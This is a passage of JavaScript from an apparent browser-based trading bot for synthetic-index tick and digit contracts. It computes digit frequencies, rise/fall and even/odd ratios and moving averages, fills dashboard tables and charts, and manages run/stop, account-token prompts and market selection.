        const dSlice = kValues.slice(i - dPeriod + 1, i + 1);
        const dValue = dSlice.reduce((a, b) => a + b, 0) / dPeriod; // Média simples
        dValues.push(dValue);
    }

    // Preenche os valores de K e D com nulos para os primeiros períodos
    while (kValues.length < stochasticRSI.length) {
        kValues.unshift(null);
    }
    while (dValues.length < kValues.length) {
        dValues.unshift(null);
    }

    return {
        stochasticRSI,
        kValues,
        dValues
    }; // Retorna um objeto com os valores de Stochastic RSI, K e D
}

let thelast10digits_digit_list;
let thelast10digits_tickmove_list;
let thelast10digits_change_list;
let thelast10digits_digitmove_list;
let thelast10digits_digitgraph_list;
let digitstatistic_list;
let thelast20digits_digitcater_list;
let thelast20digits_digitevenodd_list;
let thelast10ticks_tick_list;
let thelast10ticks_move_list;
let thelast10ticks_worm_list;
let thelast10ticks_sentiment_list;
let thelast10ticks_change_list;
let thelast10ticks_changeperc_list;
let thelast20tickworm_history_list;
let thelast20tickworm_current_list;
let tick_sma_list;
const showUpAllAboutTick = (eo, ep, eq, er) => {
  let et;
  let eu = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("digitstatistic") != -1;
  if (eu && selData.value == "digitstatistic") {
    document.getElementById("div_digitstatistic").style.display = "block";
  } else {
    document.getElementById("div_digitstatistic").style.display = "none";
  }
  if (eu) {
    let ev = [];
    let ew;
    let ex;
    let ey;
    let ez;
    let fa;
    let fb;
    let fc;
    let fd;
    let fe;
    digitstatistic_list = [];
    for (k = 1; k <= 6; k++) {
      et = ep.slice(digitstatistic_noofticks[k].value * -1);
      ev = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
      ez = [];
      fa = [];
      digitstatistic_list[k] = [];
      for (const ff of et) {
        ev[ff] = ev[ff] ? ev[ff] + 1 : 1;
      }
      ex = Math.max(...ev);
      ey = Math.min(...ev);
      for (i = 0; i <= 9; i++) {
        if (ev[i] == ex) {
          ez.push(i);
          document.getElementById("digitstatistic_" + k + "_" + i).style.backgroundColor = colorRise;
        } else {
          if (ev[i] == ey) {
            fa.push(i);
            document.getElementById("digitstatistic_" + k + "_" + i).style.backgroundColor = colorFall;
          } else {
            document.getElementById("digitstatistic_" + k + "_" + i).style.backgroundColor = colorNo;
          }
        }
        ew = (ev[i] / et.length * 100).toFixed(2);
        document.getElementById("digitstatistic_" + k + "_" + i).innerText = ew;
        digitstatistic_list[k][i] = ew * 1;
      }
      document.getElementById("digitstatistic_" + k + "_least").innerText = fa;
      document.getElementById("digitstatistic_" + k + "_most").innerText = ez;
    }
    fe = [];
    fd = [];
    digitstatistic_list[7] = [];
    for (i = 0; i <= 9; i++) {
      fb = true;
      fc = true;
      for (k = 1; k <= 6; k++) {
        var fg = rgbToHex(document.getElementById("digitstatistic_" + k + "_" + i).style.backgroundColor);
        if (fg != colorFall) {
          fb = false;
        }
        if (fg != colorRise) {
          fc = false;
        }
      }
      if (fb) {
        document.getElementById("digitstatistic_summ_" + i).innerText = i;
        document.getElementById("digitstatistic_summ_" + i).style.backgroundColor = colorFall;
        fe.push(i);
        digitstatistic_list[7][i] = i * 1;
      } else {
        if (fc) {
          document.getElementById("digitstatistic_summ_" + i).innerText = i;
          document.getElementById("digitstatistic_summ_" + i).style.backgroundColor = colorRise;
          fd.push(i);
          digitstatistic_list[7][i] = i * 1;
        } else {
          document.getElementById("digitstatistic_summ_" + i).innerText = "";
          document.getElementById("digitstatistic_summ_" + i).style.backgroundColor = "";
          digitstatistic_list[7][i] = "";
        }
      }
    }
    document.getElementById("digitstatistic_summ_least").innerText = fe;
    document.getElementById("digitstatistic_summ_most").innerText = fd;
  }
  let fh;
  let fi;
  let fj;
  let fk;
  let fl;
  let fm;
  let fn = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast10digits") != -1;
  if (fn && selData.value == "thelast10digits") {
    document.getElementById("div_thelast10digits").style.display = "block";
  } else {
    document.getElementById("div_thelast10digits").style.display = "none";
  }
  if (fn) {
    fh = eo.slice(-11);
    fi = ep.slice(-11);
    thelast10digits_digit_list = [];
    thelast10digits_tickmove_list = [];
    thelast10digits_change_list = [];
    thelast10digits_digitmove_list = [];
    thelast10digits_digitgraph_list = [];
    fl = [];
    for (i = 1; i < fi.length; i++) {
      fj = fi.length - i;
      document.getElementById("thelast10digits_digit_" + fj).innerText = fi[i];
      fk = fi[i] - fi[i - 1];
      document.getElementById("thelast10digits_change_" + fj).innerText = (fk > 0 ? "+" : fk < 0 ? "-" : "") + Math.abs(fk);
      document.getElementById("thelast10digits_digitmove_" + fj).innerText = fk > 0 ? "Rise" : fk < 0 ? "Fall" : "No";
      thelast10digits_digitmove_list.push(document.getElementById("thelast10digits_digitmove_" + fj).innerText);
      document.getElementById("thelast10digits_change_" + fj).style.backgroundColor = document.getElementById("thelast10digits_digitmove_" + fj).style.backgroundColor = fk > 0 ? colorRise : fk < 0 ? colorFall : colorNo;
      fk = fh[i] - fh[i - 1];
      document.getElementById("thelast10digits_tickmove_" + fj).innerText = fk > 0 ? "Rise" : fk < 0 ? "Fall" : "No";
      thelast10digits_tickmove_list.push(document.getElementById("thelast10digits_tickmove_" + fj).innerText);
      document.getElementById("thelast10digits_digitgraph_" + fj).innerText = (fk > 0 ? "+" : fk < 0 ? "-" : "") + fi[i];
      document.getElementById("thelast10digits_digit_" + fj).style.backgroundColor = document.getElementById("thelast10digits_tickmove_" + fj).style.backgroundColor = document.getElementById("thelast10digits_digitgraph_" + fj).style.backgroundColor = fk > 0 ? colorRise : fk < 0 ? colorFall : colorNo;
      thelast10digits_digitgraph_list.push(document.getElementById("thelast10digits_digitgraph_" + fj).innerText * 1);
      thelast10digits_digit_list.push(document.getElementById("thelast10digits_digit_" + fj).innerText * 1);
      thelast10digits_change_list.push(document.getElementById("thelast10digits_change_" + fj).innerText * 1);
      fl.push(document.getElementById("thelast10digits_change_" + fj).style.backgroundColor);
    }
    addDataChartLast10Dig_Digit(mainChartLast10Dig_Digit, thelast10digits_digit_list, fl);
    addDataChartLast10Dig_Change(mainChartLast10Dig_Change, thelast10digits_change_list, fl);
  }
  let fo = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast20digits_digitcater") != -1;
  if (fo && selData.value == "thelast20digitscaterzian") {
    document.getElementById("div_thelast20digitscaterzian").style.display = "block";
  } else {
    document.getElementById("div_thelast20digitscaterzian").style.display = "none";
  }
  if (fo) {
    fh = eo.slice(-21);
    fi = ep.slice(-21);
    thelast20digits_digitcater_list = [];
    fm = [];
    for (i = 1; i < fi.length; i++) {
      fj = fi.length - i;
      fk = fh[i] - fh[i - 1];
      document.getElementById("thelast20digits_digitcater_" + fj).innerText = (fk > 0 ? "+" : fk < 0 ? "-" : "") + fi[i];
      document.getElementById("thelast20digits_digitcater_" + fj).style.backgroundColor = fk > 0 ? colorRise : fk < 0 ? colorFall : colorNo;
      thelast20digits_digitcater_list.push(document.getElementById("thelast20digits_digitcater_" + fj).innerText * 1);
      fm.push(document.getElementById("thelast20digits_digitcater_" + fj).style.backgroundColor);
    }
    addDataChart20Cater(mainChart20Cater, thelast20digits_digitcater_list, fm);
  }
  let fp = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast20digits_digitevenodd") != -1;
  if (fp && selData.value == "thelast20digitsevenodd") {
    document.getElementById("div_thelast20digitsevenodd").style.display = "block";
  } else {
    document.getElementById("div_thelast20digitsevenodd").style.display = "none";
  }
  if (fp) {
    fh = eo.slice(-21);
    fi = ep.slice(-21);
    thelast20digits_digitevenodd_list = [];
    for (i = 1; i < fi.length; i++) {
      fj = fi.length - i;
      fk = fh[i] - fh[i - 1];
      document.getElementById("thelast20digits_digitevenodd_" + fj).innerText = fi[i] % 2 == 0 ? "Even" : "Odd";
      document.getElementById("thelast20digits_digitevenodd_" + fj).style.backgroundColor = fk > 0 ? colorRise : fk < 0 ? colorFall : colorNo;
      thelast20digits_digitevenodd_list.push(document.getElementById("thelast20digits_digitevenodd_" + fj).innerText);
    }
  }
  let fq = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("risevsfall") != -1;
  if (fq && selData.value == "risevsfall") {
    document.getElementById("div_risevsfall").style.display = "block";
  } else {
    document.getElementById("div_risevsfall").style.display = "none";
  }
  if (fq) {
    let fr;
    let fs;
    let ft;
    let fu;
    for (k = 1; k <= 6; k++) {
      let fv = risevsfall_noofticks[k].value * 1;
      et = eo.slice(-fv);
      fr = fs = 0;
      for (i = 1; i < et.length; i++) {
        if (et[i - 1] < et[i]) {
          fr++;
        }
      }
      fs = fv - fr;
      ft = fr / fv * 100;
      fu = fs / fv * 100;
      document.getElementById("risevsfall_" + k + "_rise").innerText = document.getElementById("risevsfall_" + k + "_rise").style.width = ft.toFixed(2) + "%";
      document.getElementById("risevsfall_" + k + "_fall").innerText = document.getElementById("risevsfall_" + k + "_fall").style.width = fu.toFixed(2) + "%";
    }
  }
  let fw = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("evenvsodd") != -1;
  if (fw && selData.value == "evenvsodd") {
    document.getElementById("div_evenvsodd").style.display = "block";
  } else {
    document.getElementById("div_evenvsodd").style.display = "none";
  }
  if (fw) {
    let fx;
    let fy;
    let fz;
    let ga;
    for (k = 1; k <= 6; k++) {
      let gb = evenvsodd_noofticks[k].value * 1;
      et = ep.slice(-gb);
      fx = fy = 0;
      for (i = 0; i < et.length; i++) {
        if (et[i] % 2 == 0) {
          fx++;
        }
      }
      fy = gb - fx;
      fz = fx / gb * 100;
      ga = fy / gb * 100;
      document.getElementById("evenvsodd_" + k + "_even").innerText = document.getElementById("evenvsodd_" + k + "_even").style.width = fz.toFixed(2) + "%";
      document.getElementById("evenvsodd_" + k + "_odd").innerText = document.getElementById("evenvsodd_" + k + "_odd").style.width = ga.toFixed(2) + "%";
    }
  }
  let gc = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("overvsunder") != -1;
  if (gc && selData.value == "overvsunder") {
    document.getElementById("div_overvsunder").style.display = "block";
  } else {
    document.getElementById("div_overvsunder").style.display = "none";
  }
  if (gc) {
    let gd;
    let ge;
    let gf;
    let gg;
    for (k = 1; k <= 2; k++) {
      let gh = overvsunder_noofticks[k].value * 1;
      et = ep.slice(-gh);
      gd = ge = 0;
      for (i = 0; i < et.length; i++) {
        if (et[i] > document.getElementById("overvsunder_" + k + "_overdigit").value * 1) {
          gd++;
        }
        if (et[i] < document.getElementById("overvsunder_" + k + "_underdigit").value * 1) {
          ge++;
        }
      }
      gf = gd / gh * 100;
      gg = ge / gh * 100;
      document.getElementById("overvsunder_" + k + "_over").innerText = gf.toFixed(2) + "%";
      document.getElementById("overvsunder_" + k + "_over").style.width = (gf / Math.max(gf, gg) * 100).toFixed(2) + "%";
      document.getElementById("overvsunder_" + k + "_under").innerText = gg.toFixed(2) + "%";
      document.getElementById("overvsunder_" + k + "_under").style.width = (gg / Math.max(gf, gg) * 100).toFixed(2) + "%";
    }
  }
  let gi;
  let gj = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast10ticks") != -1;
  if (gj && selData.value == "thelast10ticks") {
    document.getElementById("div_thelast10ticks").style.display = "block";
  } else {
    document.getElementById("div_thelast10ticks").style.display = "none";
  }
  if (gj) {
    let gk;
    let gl;
    let gm;
    fh = eo.slice(-39);
    thelast10ticks_tick_list = [];
    gl = [];
    thelast10ticks_move_list = [];
    thelast10ticks_worm_list = [];
    thelast10ticks_change_list = [];
    thelast10ticks_sentiment_list = [];
    gm = [];
    thelast10ticks_changeperc_list = [];
    for (i = 29; i < fh.length; i++) {
      fj = fh.length - i;
      document.getElementById("thelast10ticks_tick_" + fj).innerText = fh[i].toFixed(eq);
      document.getElementById("thelast10ticks_move_" + fj).innerText = fh[i - 1] < fh[i] ? "Rise" : fh[i - 1] > fh[i] ? "Fall" : "No";
      document.getElementById("thelast10ticks_tick_" + fj).style.backgroundColor = document.getElementById("thelast10ticks_move_" + fj).style.backgroundColor = fh[i - 1] < fh[i] ? colorRise : fh[i - 1] > fh[i] ? colorFall : colorNo;
      gi = fh.slice(i - 19, i + 1);
      document.getElementById("thelast10ticks_worm_" + fj).innerText = fh[i] == Math.max(...gi) ? "Blue" : fh[i] == Math.min(...gi) ? "Red" : "Green";
      thelast10ticks_worm_list.push(document.getElementById("thelast10ticks_worm_" + fj).innerText);
      document.getElementById("thelast10ticks_worm_" + fj).style.backgroundColor = fh[i] == Math.max(...gi) ? colorRise : fh[i] == Math.min(...gi) ? colorFall : colorWormNo;
      document.getElementById("thelast10ticks_sentiment_" + fj).innerText = fh[i - 3] < fh[i - 2] && fh[i - 2] < fh[i - 1] && fh[i - 1] < fh[i] ? "Rise" : fh[i - 3] > fh[i - 2] && fh[i - 2] > fh[i - 1] && fh[i - 1] > fh[i] ? "Fall" : "No";
      thelast10ticks_sentiment_list.push(document.getElementById("thelast10ticks_sentiment_" + fj).innerText);
      document.getElementById("thelast10ticks_sentiment_" + fj).style.backgroundColor = fh[i - 3] < fh[i - 2] && fh[i - 2] < fh[i - 1] && fh[i - 1] < fh[i] ? colorRise : fh[i - 3] > fh[i - 2] && fh[i - 2] > fh[i - 1] && fh[i - 1] > fh[i] ? colorFall : colorNo;
      fk = fh[i] - fh[i - 1];
      gk = fk / fh[i - 1] * 100;
      document.getElementById("thelast10ticks_change_" + fj).innerText = (fk > 0 ? "+" : fk < 0 ? "-" : "") + Math.abs(fk).toFixed(2);
      document.getElementById("thelast10ticks_%_" + fj).innerText = (fk > 0 ? "+" : fk < 0 ? "-" : "") + Math.abs(gk).toFixed(2);
      thelast10ticks_changeperc_list.push(document.getElementById("thelast10ticks_%_" + fj).innerText * 1);
      document.getElementById("thelast10ticks_change_" + fj).style.backgroundColor = document.getElementById("thelast10ticks_%_" + fj).style.backgroundColor = fk > 0 ? colorRise : fk < 0 ? colorFall : colorNo;
      thelast10ticks_tick_list.push(document.getElementById("thelast10ticks_tick_" + fj).innerText * 1);
      gl.push(document.getElementById("thelast10ticks_tick_" + fj).style.backgroundColor);
      thelast10ticks_move_list.push(document.getElementById("thelast10ticks_move_" + fj).innerText);
      thelast10ticks_change_list.push(document.getElementById("thelast10ticks_change_" + fj).innerText * 1);
      gm.push(document.getElementById("thelast10ticks_change_" + fj).style.backgroundColor);
    }
    addDataChartLast10Tick_Tick(mainChartLast10Tick_Tick, thelast10ticks_tick_list, gl);
    addDataChartLast10Tick_Change(mainChartLast10Tick_Change, thelast10ticks_change_list, gm);
  }
  let gn = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast20tickworm") != -1;
  if (gn && selData.value == "thelast20tickworm") {
    document.getElementById("div_thelast20tickworm").style.display = "block";
  } else {
    document.getElementById("div_thelast20tickworm").style.display = "none";
  }
  if (gn) {
    let go;
    let gp;
    let gq;
    fh = eo.slice(-39);
    thelast20tickworm_history_list = [];
    thelast20tickworm_current_list = [];
    go = [];
    gp = [];
    gq = [];
    for (i = 19; i < fh.length; i++) {
      fj = fh.length - i;
      gi = fh.slice(i - 19, i + 1);
      document.getElementById("thelast20tickworm_history_" + fj).innerText = fh[i] == Math.max(...gi) ? "Blue" : fh[i] == Math.min(...gi) ? "Red" : "Green";
      thelast20tickworm_history_list.push(document.getElementById("thelast20tickworm_history_" + fj).innerText);
      document.getElementById("thelast20tickworm_history_" + fj).style.backgroundColor = fh[i] == Math.max(...gi) ? colorRise : fh[i] == Math.min(...gi) ? colorFall : colorWormNo;
    }
    gi = fh.slice(-20);
    for (i = 19; i < fh.length; i++) {
      fj = fh.length - i;
      document.getElementById("thelast20tickworm_current_" + fj).innerText = fh[i] == Math.max(...gi) ? "Blue" : fh[i] == Math.min(...gi) ? "Red" : "Green";
      document.getElementById("thelast20tickworm_current_" + fj).style.backgroundColor = fh[i] == Math.max(...gi) ? colorRise : fh[i] == Math.min(...gi) ? colorFall : colorWormNo;
      thelast20tickworm_current_list.push(document.getElementById("thelast20tickworm_current_" + fj).innerText);
      go.push(fh[i]);
      gp.push(document.getElementById("thelast20tickworm_current_" + fj).style.backgroundColor);
      if (i != fh.length - 1) {
        gq.push(fh[i] == Math.max(...gi) ? "circle" : fh[i] == Math.min(...gi) ? "circle" : false);
      } else {
        gq.push("circle");
      }
    }
    addDataChart20TickWorm(mainChart20TickWorm, go, gp, gq);
  }
  let gr = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && (mainWorkspaceCode.indexOf("tick_sma") != -1 || mainWorkspaceCode.indexOf("TickTrisma") != -1);
  if (gr && selData.value == "tick_Trisma") {
    document.getElementById("div_tick_Trisma").style.display = "block";
  } else {
    document.getElementById("div_tick_Trisma").style.display = "none";
  }
  if (gr) {
    tick_sma_list = [];
    tempArray1 = calculateMovingAverage(eo, inpTickTrisma_period[1].value * 1).slice(-101);
    tempArray2 = calculateMovingAverage(eo, inpTickTrisma_period[2].value * 1).slice(-101);
    tempArray3 = calculateMovingAverage(eo, inpTickTrisma_period[3].value * 1).slice(-101);
    for (i = 81; i < 101; i++) {
      document.getElementById("tick_sma1_" + (101 - i)).innerText = tempArray1[i].toFixed(2);
      document.getElementById("tick_sma1_" + (101 - i)).style.backgroundColor = tempArray1[i - 1] < tempArray1[i] ? colorRise : tempArray1[i - 1] > tempArray1[i] ? colorFall : colorNo;
      document.getElementById("tick_sma2_" + (101 - i)).innerText = tempArray2[i].toFixed(2);
      document.getElementById("tick_sma2_" + (101 - i)).style.backgroundColor = tempArray2[i - 1] < tempArray2[i] ? colorRise : tempArray2[i - 1] > tempArray2[i] ? colorFall : colorNo;
      document.getElementById("tick_sma3_" + (101 - i)).innerText = tempArray3[i].toFixed(2);
      document.getElementById("tick_sma3_" + (101 - i)).style.backgroundColor = tempArray3[i - 1] < tempArray3[i] ? colorRise : tempArray3[i - 1] > tempArray3[i] ? colorFall : colorNo;
    }
    tick_sma_list[1] = tempArray1.slice(-20);
    tick_sma_list[2] = tempArray2.slice(-20);
    tick_sma_list[3] = tempArray3.slice(-20);
    addDataChartticktrisma(mainChartTickTrisma, [eo.slice(-101), tempArray1, tempArray2, tempArray3]);
  }
  let gs = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("detail3ticks") != -1;
  if (gs && selData.value == "detail3ticks") {
    document.getElementById("div_detail3ticks").style.display = "block";
  } else {
    document.getElementById("div_detail3ticks").style.display = "none";
  }
  if (gs) {
    let gt = "";
    et = eo.slice(-3);
    for (i = 1; i <= 3; i++) {
      gt = et[3 - i].toFixed(eq).substring(0, 13);
      document.getElementById("detail3ticks_" + i + "_tick").innerText = gt;
      for (k = 0; k < 12; k++) {
        if (k < gt.length) {
          document.getElementById("detail3ticks_" + i + "_" + (k + 1)).innerText = gt.charAt(k);
        } else {
          document.getElementById("detail3ticks_" + i + "_" + (k + 1)).innerText = "";
        }
      }
    }
  }
  if (er == "history") {
    sedangForgetAllTicks = false;
  }
  ;
  checkIfReadyToMainLogic();
};
const showUpAboutMultiMarket_Continuous = (gu, gv, gx, gy, gz) => {
  let hb = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("continuousindices") != -1;
  if (hb && selData.value == "continuousindices") {
    document.getElementById("div_continuousindices").style.display = "block";
  } else {
    document.getElementById("div_continuousindices").style.display = "none";
  }
  if (hb) {
    document.getElementById("continuousindices_" + gu + "_ticks").value = gv;
    document.getElementById("continuousindices_" + gu + "_digits").value = gx;
  }
  if (gz == "history") {
    sedangForgetAllTicks = false;
  }
  ;
  if (Date.now() - lastTimeCheckIfReadyToMainLogic_continuousindices[gu] < 500) {
    return;
  }
  ;
  lastTimeCheckIfReadyToMainLogic_continuousindices[gu] = Date.now();
  if (sudahRunOnceAtStart && btn_run.src.split("/").pop() === "icon_stop.png" && !sedangForgetAllTicks && navigator.onLine) {
    updateStepper(1);
    if (!chkVLose.checked || inpVLose.value <= 0) {
      conn_nya = vEval;
    } else {
      if (chkVLose.checked && countVLose < inpVLose.value) {
        if (!slaveAuthorized) {
          return;
        }
        conn_nya = v;
      } else {
        conn_nya = vEval;
      }
    }
    if (Date.now() >= timeMayOP && navigator.onLine && !sedangForgetAllTicks) {
      mainTickArray_continuousindices = gv;
      mainDigitArray_continuousindices = gx;
      mainMarket_continuousindices = arrMarket_Continuous[gu - 1];
      func$1$9$8$7$PurchaseConditions_continuousindices();
    }
  }
};

/*
const showUpCandle = (hc, hd, he) => {
  let hf;
  let hg;
  let hh;
  let hi;
  let hj;
  
  let hb = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast10candles") != -1;
  if (hb && selData.value == "thelast10candles") {
    document.getElementById("div_thelast10candles").style.display = "block";
  } else {
    document.getElementById("div_thelast10candles").style.display = "none";
  }console.log(hb);
  if (hb) {
  
  for (i = 10; i > hd.length; i--) {
    hf = document.getElementById("thelast10candles_" + hc + "_" + i);
    hf.innerText = "";
    hf.style = "";
  }
  for (i = 0; i < hd.length; i++) {
    hf = document.getElementById("thelast10candles_" + hc + "_" + (hd.length - i));
    if (hd[i].close > hd[i].open) {
      hg = "Bull";
      hh = colorRise;
    } else {
      if (hd[i].close < hd[i].open) {
        hg = "Bear";
        hh = colorFall;
      } else {
        hg = "Doji";
        hh = colorNo;
      }
    }
    hf.innerText = hg;
    hf.style.backgroundColor = hh;
  }}
  document.getElementById("thelast10candles_" + hc + "_1_open").innerText = hd[hd.length - 1].open.toFixed(he);
  document.getElementById("thelast10candles_" + hc + "_1_high").innerText = hd[hd.length - 1].high.toFixed(he);
  document.getElementById("thelast10candles_" + hc + "_1_low").innerText = hd[hd.length - 1].low.toFixed(he);
  document.getElementById("thelast10candles_" + hc + "_1_close").innerText = hd[hd.length - 1].close.toFixed(he);
  if (hd.length > 1) {
    hi = hd[hd.length - 1].close - hd[hd.length - 2].close;
    hj = hi / hd[hd.length - 2].close * 100;
    document.getElementById("thelast10candles_" + hc + "_1_change").innerText = (hi > 0 ? "+" : hi < 0 ? "-" : "") + Math.abs(hi).toFixed(2);
    document.getElementById("thelast10candles_" + hc + "_1_changepercent").innerText = (hi > 0 ? "+" : hi < 0 ? "-" : "") + Math.abs(hj).toFixed(2);
    document.getElementById("thelast10candles_" + hc + "_1_change").style.backgroundColor = document.getElementById("thelast10candles_" + hc + "_1_changepercent").style.backgroundColor = hi > 0 ? colorRise : hi < 0 ? colorFall : colorNo;
  } else {
    document.getElementById("thelast10candles_" + hc + "_1_change").innerText = document.getElementById("thelast10candles_" + hc + "_1_changepercent").innerText = document.getElementById("thelast10candles_" + hc + "_1_change").style = document.getElementById("thelast10candles_" + hc + "_1_changepercent").style = "";
  }
  checkIfReadyToMainLogic();
};*/

const updateCandleTable = (granularity) => {
    const data = candleData[granularity];
    if (!data || !data.history.length) return;

    // Determinar pip size dinamicamente
    const pipSize = mainSymbol.includes('R_') ? 2 : 3; 

    // Atualizar últimos 10 candles históricos
    for (let i = 1; i <= 10; i++) {
        const candleIndex = data.history.length - i;
        if (candleIndex < 0) break; // Evitar índices negativos

        const candle = data.history[candleIndex];
        const element = document.getElementById(`thelast10candles_${granularity}_${i}`);
        
        if (element) {
            // Formatar valor e cor
            element.textContent = candle.close.toFixed(pipSize);
            element.style.backgroundColor = candle.close > candle.open 
                ? colorRise 
                : candle.close < candle.open 
                    ? colorFall 
                    : colorNo;
        }
    }

    // Atualizar último candle completo
    const lastCandle = data.lastComplete;
    if (lastCandle) {
        const change = lastCandle.close - lastCandle.open;
        const changePercent = (change / lastCandle.open * 100).toFixed(2);

        // Mapeamento de campos
        const fields = {
            open: lastCandle.open.toFixed(pipSize),
            high: lastCandle.high.toFixed(pipSize),
            low: lastCandle.low.toFixed(pipSize),
            close: lastCandle.close.toFixed(pipSize),
            change: change.toFixed(pipSize),
            changepercent: `${changePercent}%`
        };

        // Atualizar cada campo
        Object.entries(fields).forEach(([field, value]) => {
            const element = document.getElementById(`thelast10candles_${granularity}_1_${field}`);
            if (element) {
                element.textContent = value;
                if (field === 'change' || field === 'changepercent') {
                    element.style.backgroundColor = change > 0 
                        ? colorRise 
                        : change < 0 
                            ? colorFall 
                            : colorNo;
                }
            }
        });
    }
};


const checkIfReadyToMainLogic = () => {
  if (Date.now() - lastTimeCheckIfReadyToMainLogic < 500) {
    return;
  }
  ;
  lastTimeCheckIfReadyToMainLogic = Date.now();
  if (sudahRunOnceAtStart && btn_run.src.split("/").pop() === "icon_stop.png" && !sedangForgetAllTicks && navigator.onLine) {
    mainLogic();
  } else {
    if (prContract.length != 0) {}
  }
};
const btn_runClickResponse = () => {
  if (btn_run.src.split("/").pop() == "icon_run.png") {
    if (inpMToken.value.trim().length == 0) {
      $.notify("Insira o Token da Conta Real.", {
        position: "bottom left",
        className: "warn"
      });
      document.getElementById("divPopupToken").style.display = "block";
      inpMToken.focus();
    } else {
      mainWorkspaceCode = javascript.javascriptGenerator.workspaceToCode(Blockly.getMainWorkspace());
      updateStatusBotRunning("Preparando Bot...");
      ubahbtn_run("stop");
      updateStepper(0);
      countVLose = 0;
      sudahRunOnceAtStart = false;
      if (inpSToken.value.trim().length > 0) {
        authorizeV();
      }
      authorize();
      showBoxSummary();
      document.getElementById("btn_clearBoxSummary").hidden = true;
    }
  } else {
    if (btn_run.src.split("/").pop() == "icon_stop.png") {
      emptyAllFunc();
      ubahbtn_run("run");
      updateStatusBotRunning("Bot parado");
      sedangAuthorize = false;
      sedangAuthorizeV = false;
      sudahRunOnceAtStart = false;
      timeMayOP = 0;
      document.getElementById("btn_clearBoxSummary").hidden = false;
      refreshBoxData(selData.value);
    }
  }
};
const emptyAllFunc = () => {
  func$1$9$8$7$RunOnceAtStart = () => {
    izinRun2 = false;
  };
  func$1$9$8$7$PurchaseConditions = () => {
    if (izinRun2) {
      izinRun2 = false;
    }
    ;
  };
  func$1$9$8$7$PurchaseConditions_continuousindices = () => {};
  func$1$9$8$7$SellConditions = () => {};
  func$1$9$8$7$RestartTradingConditions = () => {};
};
emptyAllFunc();
const openResponse = () => {
  wsMasterOpened = true;
  getSymbols();
  
  if (sedangAuthorize) {
    subscribeAllCandles();
  }
  
  cekWSOpened();
  if (sedangAuthorize) {
    authorize();
  }
};
const openResponseV = () => {
  wsSlaveOpened = true;
  cekWSOpened();
  if (sedangAuthorizeV) {
    authorizeV();
  }
};
const getSymbols = () => {
  vEval.send(JSON.stringify({
    active_symbols: "brief",
    passthrough: {
      app_id: app_id
    }
  }));
};
const arrangeSymbols = hk => {
  arrMarket = [];
  arrMarketToSubMarket = [];
  arrSubMarketToSymbol = [];
  for (i = 0; i < hk.active_symbols.length; i++) {
    if (!arrMarket.includes(hk.active_symbols[i].market_display_name)) {
      arrMarket.push(hk.active_symbols[i].market_display_name);
    }
    if (!arrMarketToSubMarket.includes(hk.active_symbols[i].market_display_name + "|" + hk.active_symbols[i].submarket_display_name)) {
      arrMarketToSubMarket.push(hk.active_symbols[i].market_display_name + "|" + hk.active_symbols[i].submarket_display_name);
    }
    if (!arrSubMarketToSymbol.includes(hk.active_symbols[i].submarket_display_name + "|" + hk.active_symbols[i].display_name + "|" + hk.active_symbols[i].symbol)) {
      arrSubMarketToSymbol.push(hk.active_symbols[i].submarket_display_name + "|" + hk.active_symbols[i].display_name + "|" + hk.active_symbols[i].symbol);
    }
  }
  selMarket.innerHTML = "";
  for (i = 0; i < arrMarket.length; i++) {
    el = document.createElement("option");
    el.textContent = arrMarket[i];
    el.value = arrMarket[i];
    selMarket.appendChild(el);
  }
  if (localStorage.getItem("selSymbol") != null) {
    setMarket(localStorage.getItem("selSymbol"));
  } else {
    setMarket("1HZ10V");
  }
};
const setMarket = hl => {
  let hm;
  let hn;
  for (i = 0; i < arrSubMarketToSymbol.length; i++) {
    if (arrSubMarketToSymbol[i].split("|")[2] == hl) {
      hn = arrSubMarketToSymbol[i].split("|")[0];
      break;
    }
  }
  for (i = 0; i < arrMarketToSubMarket.length; i++) {
    if (arrMarketToSubMarket[i].split("|")[1] == hn) {
      hm = arrMarketToSubMarket[i].split("|")[0];
      break;
    }
  }
  selMarket.value = hm;
  fillSubMarket(hn, hl);
};
const fillSubMarket = (ho, hp) => {
  selSubMarket.innerHTML = "";
  for (i = 0; i < arrMarketToSubMarket.length; i++) {
    if (arrMarketToSubMarket[i].split("|")[0] == selMarket.value) {
      el = document.createElement("option");
      el.textContent = arrMarketToSubMarket[i].split("|")[1];
      el.value = arrMarketToSubMarket[i].split("|")[1];
      selSubMarket.appendChild(el);
    }
  }
  if (ho != "none") {
    selSubMarket.value = ho;
  }
  fillSymbol(hp);
};
const fillSymbol = hq => {
  selSymbol.innerHTML = "";
  for (i = 0; i < arrSubMarketToSymbol.length; i++) {
    if (arrSubMarketToSymbol[i].split("|")[0] == selSubMarket.value) {
      el = document.createElement("option");
      el.textContent = arrSubMarketToSymbol[i].split("|")[1];
      el.value = arrSubMarketToSymbol[i].split("|")[2];
      selSymbol.appendChild(el);
    }
  }
  if (hq != "none") {
    selSymbol.value = hq;
  }
  mainSymbol = selSymbol.value;
